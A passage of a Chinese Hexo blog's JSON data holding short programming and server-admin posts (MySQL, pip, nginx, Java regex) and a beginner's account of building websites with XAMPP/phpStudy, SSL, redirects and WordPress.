class=\"title\">getDate</span>(<span class=\"params\">cur_m, day_m</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// cur_m，0-本周，1-下周，2-下下周...</span></span><br><span class=\"line\">  <span class=\"comment\">// day_m，1-周一，2-周二...7-周日</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\">  <span class=\"keyword\">var</span> day = date.getDay() || <span class=\"number\">7</span>;</span><br><span class=\"line\">  date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(date.getFullYear(), date.getMonth(), date.getDate() - day + day_m + <span class=\"number\">7</span> * cur_m);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> y = date.getFullYear();</span><br><span class=\"line\">  <span class=\"keyword\">var</span> m = date.getMonth() + <span class=\"number\">1</span>;</span><br><span class=\"line\">  m = m &lt; <span class=\"number\">10</span> ? <span class=\"string\">'0'</span> + m : m;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> d = date.getDate();</span><br><span class=\"line\">  d = d &lt; <span class=\"number\">10</span> ? (<span class=\"string\">'0'</span> + d) : d;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> y + <span class=\"string\">'-'</span> + m + <span class=\"string\">'-'</span> + d;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"mysql清空表，并让自增从0开始","date":"2020-12-23T05:51:34.000Z","_content":"\nmysql清空表与自增\n\n```mysql\ntruncate table table_name;\n```\n\n* tableName替换你的表名","source":"_posts/newpost-7.md","raw":"---\ntitle: mysql清空表，并让自增从0开始\ndate: 2020-12-23 13:51:34\ntags: [编程,MySQL]\n---\n\nmysql清空表与自增\n\n```mysql\ntruncate table table_name;\n```\n\n* tableName替换你的表名","slug":"newpost-7","published":1,"updated":"2020-12-23T05:54:30.647Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd6000yq0szn9dxvvhp","content":"<p>mysql清空表与自增</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">truncate table table_name;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>tableName替换你的表名</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>mysql清空表与自增</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">truncate table table_name;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>tableName替换你的表名</li>\n</ul>\n"},{"title":"pip 安装 tensorflow MemoryError","date":"2021-01-18T08:11:46.000Z","_content":"\n原因是内存不够了，可以添加`--no-cache-dir`禁用缓存，例如：\n\n```\npip install --no-cache-dir tenstoflow==2.2.0\n```\n\n","source":"_posts/newpost-9.md","raw":"---\ntitle: pip 安装 tensorflow MemoryError\ndate: 2021-01-18 16:11:46\ntags: [编程,Python]\n---\n\n原因是内存不够了，可以添加`--no-cache-dir`禁用缓存，例如：\n\n```\npip install --no-cache-dir tenstoflow==2.2.0\n```\n\n","slug":"newpost-9","published":1,"updated":"2021-01-18T08:13:49.966Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd7000zq0sz5u4jm77i","content":"<p>原因是内存不够了，可以添加<code>--no-cache-dir</code>禁用缓存，例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install --no-cache-dir tenstoflow==2.2.0</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>原因是内存不够了，可以添加<code>--no-cache-dir</code>禁用缓存，例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install --no-cache-dir tenstoflow==2.2.0</span><br></pre></td></tr></table></figure>\n"},{"title":"常见nginx反向代理配置","date":"2020-11-13T02:20:28.000Z","_content":"\n* 此配置可以用于jenkins反向代理等\n\n```nginx\nlocation / {\n    proxy_pass http://127.0.0.1:8888;\n    proxy_http_version  1.1;\n    proxy_cache_bypass  $http_upgrade;\n    proxy_set_header Upgrade           $http_upgrade;\n    proxy_set_header Connection        \"upgrade\";\n    proxy_set_header Host              $host;\n    proxy_set_header X-Real-IP         $remote_addr;\n    proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_set_header X-Forwarded-Host  $host;\n    proxy_set_header X-Forwarded-Port  $server_port;\n}\n```\n\n","source":"_posts/newpost.md","raw":"---\ntitle: 常见nginx反向代理配置\ndate: 2020-11-13 10:20:28\ntags: [运维,Nginx]\n---\n\n* 此配置可以用于jenkins反向代理等\n\n```nginx\nlocation / {\n    proxy_pass http://127.0.0.1:8888;\n    proxy_http_version  1.1;\n    proxy_cache_bypass  $http_upgrade;\n    proxy_set_header Upgrade           $http_upgrade;\n    proxy_set_header Connection        \"upgrade\";\n    proxy_set_header Host              $host;\n    proxy_set_header X-Real-IP         $remote_addr;\n    proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_set_header X-Forwarded-Host  $host;\n    proxy_set_header X-Forwarded-Port  $server_port;\n}\n```\n\n","slug":"newpost","published":1,"updated":"2020-12-07T02:03:52.082Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd70010q0szy8gnrz13","content":"<ul>\n<li>此配置可以用于jenkins反向代理等</li>\n</ul>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:8888;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_http_version</span>  <span class=\"number\">1</span>.<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache_bypass</span>  <span class=\"variable\">$http_upgrade</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Upgrade           <span class=\"variable\">$http_upgrade</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Connection        <span class=\"string\">\"upgrade\"</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Host              <span class=\"variable\">$host</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Real-IP         <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-For   <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-Proto <span class=\"variable\">$scheme</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-Host  <span class=\"variable\">$host</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-Port  <span class=\"variable\">$server_port</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>此配置可以用于jenkins反向代理等</li>\n</ul>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:8888;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_http_version</span>  <span class=\"number\">1</span>.<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache_bypass</span>  <span class=\"variable\">$http_upgrade</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Upgrade           <span class=\"variable\">$http_upgrade</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Connection        <span class=\"string\">\"upgrade\"</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Host              <span class=\"variable\">$host</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Real-IP         <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-For   <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-Proto <span class=\"variable\">$scheme</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-Host  <span class=\"variable\">$host</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-Port  <span class=\"variable\">$server_port</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"Java过滤html标签","date":"2020-12-28T06:26:04.000Z","_content":"\n假设str为html富文本，则\n\n```java\nstr.replaceAll(\"\\\\&[a-zA-Z]{1,10};\", \"\").replaceAll(\"<[^>]*>\", \"\").replaceAll(\"[(/>)<]\", \"\")\n```","source":"_posts/newpost-8.md","raw":"---\ntitle: Java过滤html标签\ndate: 2020-12-28 14:26:04\ntags: [编程,Java]\n---\n\n假设str为html富文本，则\n\n```java\nstr.replaceAll(\"\\\\&[a-zA-Z]{1,10};\", \"\").replaceAll(\"<[^>]*>\", \"\").replaceAll(\"[(/>)<]\", \"\")\n```","slug":"newpost-8","published":1,"updated":"2020-12-28T06:27:30.231Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd90013q0sz651sq994","content":"<p>假设str为html富文本，则</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str.replaceAll(<span class=\"string\">\"\\\\&amp;[a-zA-Z]&#123;1,10&#125;;\"</span>, <span class=\"string\">\"\"</span>).replaceAll(<span class=\"string\">\"&lt;[^&gt;]*&gt;\"</span>, <span class=\"string\">\"\"</span>).replaceAll(<span class=\"string\">\"[(/&gt;)&lt;]\"</span>, <span class=\"string\">\"\"</span>)</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>假设str为html富文本，则</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str.replaceAll(<span class=\"string\">\"\\\\&amp;[a-zA-Z]&#123;1,10&#125;;\"</span>, <span class=\"string\">\"\"</span>).replaceAll(<span class=\"string\">\"&lt;[^&gt;]*&gt;\"</span>, <span class=\"string\">\"\"</span>).replaceAll(<span class=\"string\">\"[(/&gt;)&lt;]\"</span>, <span class=\"string\">\"\"</span>)</span><br></pre></td></tr></table></figure>"},{"title":"一个小白的自学建站史（菜鸟建站入门）","date":"2017-03-07T14:14:49.000Z","_content":"\n# 接触\n\n### 内网的尝试\n\n<!--more-->\n\n可能有点特别，我刚开始接触与网站相关是在一个关于DVWA这个漏洞系统的搭建上。那时破晓团队的创始人之一K0r4dji到我们学校来有一个讲座，他讲了很多看起来特别高大上的东西。演讲后有一个面基会，我就去参加并找到他，并表示想学一些网络安全技术，希望他能帮我引进门。他就给我介绍了很多东西，其中就包括了DVWA这个漏洞平台，于是百度安装方法，找到了一篇FreeBuf上的文章：[新手指南：手把手教你如何搭建自己的渗透测试环境](http://www.freebuf.com/sectool/102661.html)接触到了xampp这款软件。但是安装了软件之后一脸懵逼，完全不懂，还好教程上边有详细的介绍，一步一步，虽然不理解，但是总归是成功安装了，在电脑上输入127.0.0.1/dvwa/login.php，成功进入！接下来问题就来了，我要如何让别人访问这个漏洞系统呢？教程写着：ip-address-of-windows-xp-machine/dvwa/login.php，于是我傻乎乎的在别的电脑上输入进去，结果不行，一番苦思冥想，终于尝试把“ip-address-of-windows-xp-machine”替换为我电脑内网的IP，成功了，有一点点小激动，也有了一些明悟，IP地址似乎就是相当于一台电脑的标志，每一台处于同一内网环境的电脑都有与其唯一对应的IP地址，通过这个IP可以访问这台电脑（服务器）的数据。之后我又尝试了用自己所学的HTML知识写了网页放到xampp\\htdocs目录，然后访问该电脑的IP，果然可以打开网站，仿佛明白的从小到大一直在访问的网站的一点工作方法。\n\n### 公网服务器被黑\n\n之后偶然的一个机会得知了服务器运营商的存在，比如腾讯云、阿里云、百度云等等，于是我就在腾讯云上试用了一台服务器，用了windows系统，有5天时间，建议通过windows系统自带的远程桌面连接，方法为：\n\n按组合键windows+R，并在运行中输入\"mstsc\"；\n\n在跳出来的界面输入你的服务器公网IP地址，并按提示输入用户名和密码即可。\n第一件事就是在上边安装了xampp，然后把xampp\\htdocs目录下文件替换为DVWA，接着把IP地址放到了一个CTF交流群里，当天晚上，有个人在群里问我，这是你的网站吗？我说是，他说你改一个文件给我看看，我就改了，然后我的服务器就被黑客拿下了，还留了后门……这之后才知道DVWA是不能乱放的，不过起码到此为止，我已经可以建立一个外网可以访问的网站了。\n\n# 深入\n\n### 有了模样\n\n我在阿里云的首页上看到有域名注册，于是尝试着注册了我的第一个域名：**_**_**.top（这个域名现在已经不用了，所以打码了），记得是1块钱首年，嘿嘿，但还是不知道要怎么才能使得访问域名就能访问服务器。因为一直自学，我花费了好几天时间，才知道有域名解析这种东西，于是点击域名管理，找到我的域名后点击解析，点击添加记录，主机记录用了www，记录值就填上了我腾讯云服务器的IP地址，然后访问www.**_**_**.top ，成功访问到了我的网站。再之后我开始自己手写网站，命名为1.html，放到服务器里，结果在我访问服务器的时候，浏览器直接列出了我的网站目录（xampp默认开启了目录列表，不然应该是403禁止访问），要手动点击1.html才能打开网站，这可别扭死了！如下图为列出目录\n<img src=\"https://blog-10039692.file.myqcloud.com/1488433467435_4319_1488433466589.jpg\"  />\n下图为403\n![](https://blog-10039692.file.myqcloud.com/1488433487113_5678_1488433485867.jpg)\n然后尝试各种姿势百度，百度了好长好长时间（估计这种人尽皆知的东西都没人懒得说），才看到了被一句带过的index.html，于是把网页重命名为index.html（修改配置文件也是可以修改默认主页的），成功了！至此，我的网站终于看起来像是一个网站了！如图为我当时建立网站之一：\n![](https://blog-10039692.file.myqcloud.com/1488432964695_8706_1488432964443.jpg)\n\n### 一服多站\n\n之后随着对CTF的了解，萌生了建立一个CTF资源站的想法，然后又想建立一个自己主页（这也算是一个小时候的梦想吧），但是服务器只有一台，IP只有一个，如果都放在同一个目录下用同一个域名的话总觉得别扭，这个要怎么解决呢？又一次和朋友聊天的时候他推荐给我一个软件叫phpstudy，果断放弃xampp使用phpstudy，在phpstudy有一个功能叫做站点域名管理，如下图\n![](https://blog-10039692.file.myqcloud.com/1488434278819_4925_1488434277635.jpg)![](https://blog-10039692.file.myqcloud.com/1488434289682_3677_1488434288559.jpg)\n于是把需要的域名都通过A记录解析到我的服务器上，再添加到域名管理里边，成功实现了一服多站。\n随着研究的深入，后来知道：phpstudy是基于apache（也可以选择nginx或iis作为phpstudy的基本程序），通过修改apache的站点配置文件（目录在PHPstudy/Apache/conf/vohsts.conf）也可以实现同样效果，相信聪明的你和我一样一看就懂了，如图：\n![](https://blog-10039692.file.myqcloud.com/1488436133365_8283_1488436133876.jpg)\n至此，我已经可以较为完善的拥有一个网站服务器了\n\n# 建站经验\n\n### 备案\n\n备案对于国内网站来说是必不可少的一个环节，在腾讯云官网首页上就有备案的链接，如图：\n![](https://blog-10039692.file.myqcloud.com/1488436460607_8841_1488436459506.jpg)\n按照要求一步步备案就好了，这里通常耗时较长，我的第一次备案差不多用了俩月可能还多，备案的过程中域名是不允许有解析的，也就是说，只要你要备案，你的网站必须是关闭的！所以对于有经验的站长来说，一般都是先备案，后建站，不然的话网站运行着好好的突然关了，不知道的人还以为你的网站倒闭了呢！或许有人不信邪，我就不备案咋了？不备案的话刚开始应该是没什么问题的，但使用一段时间之后，国内的服务商就会把你服务器的端口关掉，网站就用不了了，所以记住一句话：要建站，先备案！除非你用的是港服或者外服。\n\n### SSL\n\n在访问例如腾讯云、百度等网站的时候，会在Chrome浏览器的网址栏看到这样一个绿色的小锁![](https://blog-10039692.file.myqcloud.com/1488437662385_3300_1488437662130.jpg) ，感觉特别好，但是访问我自己的网站却只有一个灰色的感叹号![http://dz.gl](https://blog-10039692.file.myqcloud.com/1488437772942_1273_1488437772290.jpg) ，于是就想，我的网站能不能也有这样一个绿色小锁呢？又是一番各种姿势百度，知道了这个是https协议，需要有网站安全证书，到百度搜了一番，都好贵，舍不得花钱啊~但是峰回路转，发现腾讯云有免费的SSL证书，在管理中心-左上角云产品-SSL证书管理里边，如图：\n![](https://blog-10039692.file.myqcloud.com/1488438092663_448_1488438101157.jpg)\n点击申请证书，按提示操作之后就可以拥有自己的证书了，不过，这个证书只支持2级域名\n![](https://blog-10039692.file.myqcloud.com/1488438268450_1105_1488438279405.jpg)\n之后在找到对应的证书并且在服务器上安装即可，我用的是Apache，所以把对应SSL证书(有三个文件)上传到服务器某目录下（例如我创建了PHPstudy/SSL文件夹并上传到该目录下），按照网上的教程修改配置文件，具体方法如下：\n\n1.  首先是确认ssl功能是否开启：找到PHPstudy/Apache/conf/httpd.conf这个配置文件中的LoadModule ssl_module modules/mod_ssl.so这句话是否前面有注释符#，如果有的话删掉注释符并保存；\n在PHPstudy/Apache/conf/httpd.conf中添加这样一句话：Include conf/vhost-ssl.conf 并保存；\n在PHPstudy/Apache/conf目录下创建vhost-ssl.conf文件，然后编辑（建议使用notepad++编辑，极不推荐记事本）之如下：\n```\n <VirtualHost *:443>\n  ServerName www.ctftools.com //这里改为你自己的域名，如果只有一个网站可以把这行删掉\n  DocumentRoot  \"C:\\WEB\\CTFtools\" //这里是你的网站目录\n  SSLEngine on\n  SSLProtocol  all -SSLv2 -SSLv3\n  SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL\n  SSLCertificateFile \"C:\\phpStudy\\ssl\\downssl\\1.crt\" //证书公钥，大小为2.01KB左右\n  SSLCertificateKeyFile \"C:\\phpStudy\\ssl\\downssl\\3.key\" //证书私钥\n  SSLCertificateChainFile \"C:\\phpStudy\\ssl\\downssl\\2.crt\" //证书链，大小为1.88KB左右\n </VirtualHost>\n //有几个站点就写几个这样的一段代码\n <VirtualHost *:443>\n  ServerName www.dr34m.cn\n  DocumentRoot \"C:\\WEB\\myhome\"\n  SSLEngine on\n  SSLProtocol  all -SSLv2 -SSLv3\n  SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL\n  SSLCertificateFile \"C:\\phpStudy\\ssl\\homessl\\1.crt\"\n  SSLCertificateKeyFile \"C:\\phpStudy\\ssl\\homessl\\3.key\"\n  SSLCertificateChainFile \"C:\\phpStudy\\ssl\\homessl\\2.crt\"\n </VirtualHost>\n```\n2.  重启phpstudy，然后访问https:// 再加上你的站点，是不是可以访问了？\n **注：**如果遇到重启后无法开启Apache，通常是你的配置文件有问题，要有耐心，慢慢查找配置文件的错误。还有一种可能是你的证书公钥和证书链两个文件反了，颠倒过来即可。\n\n ## 301重定向\n\n 刚开始是在访问腾讯云的时候，发现无论输入的是`qcloud.com`，还是`www.qcloud.com`，或者是`http://www.qcloud.com`，最后访问的都是`https://www.qcloud.com`，这个可就挺好玩的了，刚开始以为是做的跳转，在`qcloud.com`目录下建立一个自动跳转到`www.qcloud.com`的网页，后来知道是做的301重定向，做301重定向的好处就是对搜索引擎友好。为什么要做301重定向呢？一方面，301重定向可以使例如`qcloud.com`跳转到`www.qcloud.com`，这样能增加`www.qcloud.com`的权重；另一方面，我们之前做的SSL证书用的是443端口，并且网址前缀是https，用301重定向可以使得例如`http://www.qcloud.com`跳转到`https://www.qcoloud.com`，没有这步跳转，那我们的SSL证书就白用了，301重定向的办法很多，我用到了其中两种，具体如下：\n\n ### php做重定向\n\n 这种是用在例如`qcloud.com`跳转到`www.qcloud.com`上的，当然，有些网站的权重是放在没有www的网址上，把有www的跳转到没有www的网址上，也是同样的方法\n\n1.  在PHPstudy\\WWW目录下新建文件index.php（对于这种情况就不需要在站点域名配置中添加**非**权重网址了，但是权重网址还是要有的）；\n2.  编辑该文件如下\n```php\n<?php\n\n $the_host = $_SERVER['HTTP_HOST'];\n\n switch($the_host)\n {\n //下边的就是带www的网址作为权重网址的例子\n     case 'ctftools.com': //这里改为你的非权重网址\n     {\n         header('HTTP/1.1 301 Moved Permanently'); //301是永久重定向的意思\n         header('Location:https://www.ctftools.com/');  //这里改为你的权重网址\n     }\n     break;\n//下边的就是不带www的网址作为权重网址的例子\n     case 'www.dz.gl':\n     {\n         header('HTTP/1.1 301 Moved Permanently');\n         header('Location:http://dz.gl');\n     }\n     break;\n//下边则是不符合以上所有情况的例子，学过编程的应该都知道这些语法\n     default:\n     {\n         header('HTTP/1.1 302 Moved Permanently'); //302则是临时重定向的意思\n         header('Location:http://error.ctftools.com/404.html');  //这里可以定向到你的404页面\n     }\n }\n?>\n```\n\n ### .htaccess做重定向\n\n 上边的php方法对于权重网站重定向来说无疑是一种简单的方法，但是对于http向https跳转则没办法了，这就需要.htaccess做重定向（这种方法同样适用于权重网站跳转），方法如下：\n\n1.首先打开`PHPstudy/Apache/conf/httpd.conf`并检查`LoadModule rewrite_module modules/mod_rewrite.so`这句话前面有没有注释符#，有则删掉;\n在**网站目录**下创建.htaccess文件，这种以点开头的文件在windows下不好创建，通常使用dos命令来创建，或者用notepad++，新建一个文件，在保存的时候类型选择所有文件，文件名改为.htaccess，如图：![](https://blog-10039692.file.myqcloud.com/1488441538912_436_1488441538316.jpg)\n编辑该文件如下：\n```\n<IfModule mod_rewrite.c>\nRewriteEngine on\nRewriteCond %{SERVER_PORT} !^443$\nRewriteRule ^(.*)$ https://www.ctftools.com/$1 [L,R=301]  //改为你的站点\n</IfModule>\n```\n2. 这时候直接访问http:// 加上你的站点，是不是直接就能跳转到https:// 加上你的站点了？\n\n# 在服务器上安装wordpress\n\n**wordpress是一个著名的博客系统，安装主要用到了mysql(phpstudy集成了)，具体安装方法如下：**\n\n### 配置MySQL\n\n1.  首先修改mysql的密码(针对忘了密码或者不知道密码的童鞋)，如图修改即可；\n![](https://blog-10039692.file.myqcloud.com/1488443780553_6823_1488443779593.jpg)\n2.  接着访问：[http://你的IP/phpmyadmin](http://xn--ip-0p3cm89l/phpmyadmin) 或者点击phpstudy上边的MySQL管理器—MySQL-front（如图）\n![](https://blog-10039692.file.myqcloud.com/1488443755039_5831_1488443754438.jpg)\n3.  新建一个数据库：如图，以在服务器端MySQL-front中操作为例：\n右击左侧localhost—新建—数据库\n![](https://blog-10039692.file.myqcloud.com/1488444028336_2727_1488444027827.jpg)\n![](https://blog-10039692.file.myqcloud.com/1488444073489_993_1488444072473.jpg)\n\n### 安装wordpress\n\n1.  到[wordpress官网](https://cn.wordpress.org/)下载wordpress并上传到你的服务器某目录下；\n2.  访问\"你的目录所绑定域名/wp-admin/install.php\"，会出现如图：\n![](https://blog-10039692.file.myqcloud.com/1488444539486_5449_1488444539273.jpg)\n3.  按图操作：\n![](https://blog-10039692.file.myqcloud.com/1488444576677_3585_1488444575741.jpg)\n4.  如果数据库信息没有问题就会出现\n![](https://blog-10039692.file.myqcloud.com/1488444591766_7065_1488444590814.jpg)\n5.  接着按提示输入你的站点信息：\n![](https://blog-10039692.file.myqcloud.com/1488444713598_3604_1488444713356.jpg)\n6.  这样就可以拥有自己的博客或者论坛了\n关于windows建站经验就写到这里，以后我或许会改用linux，届时还会和大家分享，感谢阅读","source":"_posts/post005.md","raw":"---\ntitle: 一个小白的自学建站史（菜鸟建站入门）\ndate: 2017-03-07 22:14:49\ntags: [运维,Nginx]\n---\n\n# 接触\n\n### 内网的尝试\n\n<!--more-->\n\n可能有点特别，我刚开始接触与网站相关是在一个关于DVWA这个漏洞系统的搭建上。那时破晓团队的创始人之一K0r4dji到我们学校来有一个讲座，他讲了很多看起来特别高大上的东西。演讲后有一个面基会，我就去参加并找到他，并表示想学一些网络安全技术，希望他能帮我引进门。他就给我介绍了很多东西，其中就包括了DVWA这个漏洞平台，于是百度安装方法，找到了一篇FreeBuf上的文章：[新手指南：手把手教你如何搭建自己的渗透测试环境](http://www.freebuf.com/sectool/102661.html)接触到了xampp这款软件。但是安装了软件之后一脸懵逼，完全不懂，还好教程上边有详细的介绍，一步一步，虽然不理解，但是总归是成功安装了，在电脑上输入127.0.0.1/dvwa/login.php，成功进入！接下来问题就来了，我要如何让别人访问这个漏洞系统呢？教程写着：ip-address-of-windows-xp-machine/dvwa/login.php，于是我傻乎乎的在别的电脑上输入进去，结果不行，一番苦思冥想，终于尝试把“ip-address-of-windows-xp-machine”替换为我电脑内网的IP，成功了，有一点点小激动，也有了一些明悟，IP地址似乎就是相当于一台电脑的标志，每一台处于同一内网环境的电脑都有与其唯一对应的IP地址，通过这个IP可以访问这台电脑（服务器）的数据。之后我又尝试了用自己所学的HTML知识写了网页放到xampp\\htdocs目录，然后访问该电脑的IP，果然可以打开网站，仿佛明白的从小到大一直在访问的网站的一点工作方法。\n\n### 公网服务器被黑\n\n之后偶然的一个机会得知了服务器运营商的存在，比如腾讯云、阿里云、百度云等等，于是我就在腾讯云上试用了一台服务器，用了windows系统，有5天时间，建议通过windows系统自带的远程桌面连接，方法为：\n\n按组合键windows+R，并在运行中输入\"mstsc\"；\n\n在跳出来的界面输入你的服务器公网IP地址，并按提示输入用户名和密码即可。\n第一件事就是在上边安装了xampp，然后把xampp\\htdocs目录下文件替换为DVWA，接着把IP地址放到了一个CTF交流群里，当天晚上，有个人在群里问我，这是你的网站吗？我说是，他说你改一个文件给我看看，我就改了，然后我的服务器就被黑客拿下了，还留了后门……这之后才知道DVWA是不能乱放的，不过起码到此为止，我已经可以建立一个外网可以访问的网站了。\n\n# 深入\n\n### 有了模样\n\n我在阿里云的首页上看到有域名注册，于是尝试着注册了我的第一个域名：**_**_**.top（这个域名现在已经不用了，所以打码了），记得是1块钱首年，嘿嘿，但还是不知道要怎么才能使得访问域名就能访问服务器。因为一直自学，我花费了好几天时间，才知道有域名解析这种东西，于是点击域名管理，找到我的域名后点击解析，点击添加记录，主机记录用了www，记录值就填上了我腾讯云服务器的IP地址，然后访问www.**_**_**.top ，成功访问到了我的网站。再之后我开始自己手写网站，命名为1.html，放到服务器里，结果在我访问服务器的时候，浏览器直接列出了我的网站目录（xampp默认开启了目录列表，不然应该是403禁止访问），要手动点击1.html才能打开网站，这可别扭死了！如下图为列出目录\n<img src=\"https://blog-10039692.file.myqcloud.com/1488433467435_4319_1488433466589.jpg\"  />\n下图为403\n![](https://blog-10039692.file.myqcloud.com/1488433487113_5678_1488433485867.jpg)\n然后尝试各种姿势百度，百度了好长好长时间（估计这种人尽皆知的东西都没人懒得说），才看到了被一句带过的index.html，于是把网页重命名为index.html（修改配置文件也是可以修改默认主页的），成功了！至此，我的网站终于看起来像是一个网站了！如图为我当时建立网站之一：\n![](https://blog-10039692.file.myqcloud.com/1488432964695_8706_1488432964443.jpg)\n\n### 一服多站\n\n之后随着对CTF的了解，萌生了建立一个CTF资源站的想法，然后又想建立一个自己主页（这也算是一个小时候的梦想吧），但是服务器只有一台，IP只有一个，如果都放在同一个目录下用同一个域名的话总觉得别扭，这个要怎么解决呢？又一次和朋友聊天的时候他推荐给我一个软件叫phpstudy，果断放弃xampp使用phpstudy，在phpstudy有一个功能叫做站点域名管理，如下图\n![](https://blog-10039692.file.myqcloud.com/1488434278819_4925_1488434277635.jpg)![](https://blog-10039692.file.myqcloud.com/1488434289682_3677_1488434288559.jpg)\n于是把需要的域名都通过A记录解析到我的服务器上，再添加到域名管理里边，成功实现了一服多站。\n随着研究的深入，后来知道：phpstudy是基于apache（也可以选择nginx或iis作为phpstudy的基本程序），通过修改apache的站点配置文件（目录在PHPstudy/Apache/conf/vohsts.conf）也可以实现同样效果，相信聪明的你和我一样一看就懂了，如图：\n![](https://blog-10039692.file.myqcloud.com/1488436133365_8283_1488436133876.jpg)\n至此，我已经可以较为完善的拥有一个网站服务器了\n\n# 建站经验\n\n### 备案\n\n备案对于国内网站来说是必不可少的一个环节，在腾讯云官网首页上就有备案的链接，如图：\n![](https://blog-10039692.file.myqcloud.com/1488436460607_8841_1488436459506.jpg)\n按照要求一步步备案就好了，这里通常耗时较长，我的第一次备案差不多用了俩月可能还多，备案的过程中域名是不允许有解析的，也就是说，只要你要备案，你的网站必须是关闭的！所以对于有经验的站长来说，一般都是先备案，后建站，不然的话网站运行着好好的突然关了，不知道的人还以为你的网站倒闭了呢！或许有人不信邪，我就不备案咋了？不备案的话刚开始应该是没什么问题的，但使用一段时间之后，国内的服务商就会把你服务器的端口关掉，网站就用不了了，所以记住一句话：要建站，先备案！除非你用的是港服或者外服。\n\n### 